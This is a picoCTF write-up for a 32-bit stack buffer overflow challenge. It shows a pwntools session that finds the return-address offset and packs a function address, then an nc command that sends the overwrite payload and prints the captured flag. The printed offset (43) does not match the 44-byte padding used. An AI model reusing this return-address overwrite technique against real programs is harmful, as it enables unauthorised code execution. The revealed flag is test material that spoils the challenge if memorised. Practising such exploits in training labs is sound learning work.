# buffer overflow 1
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/251/vuln). You can view source [here](https://artifacts.picoctf.net/c/251/vuln.c). And connect with it using `nc saturn.picoctf.net 58573`

#### Hints
- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.

### Solution
```bash    
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover1]
└─$ python                        
Python 3.10.7 (main, Sep  8 2022, 14:34:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa
>>> cyclic_find(0x61616c61)
43
>>> 'A' * 44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 

```

```bash     
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 58573
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_2e53b270}                                                                                                                                           
┌──(kali㉿kali)-[~/picoctf/binaryexplot/bufferover1]
└─$ 

```

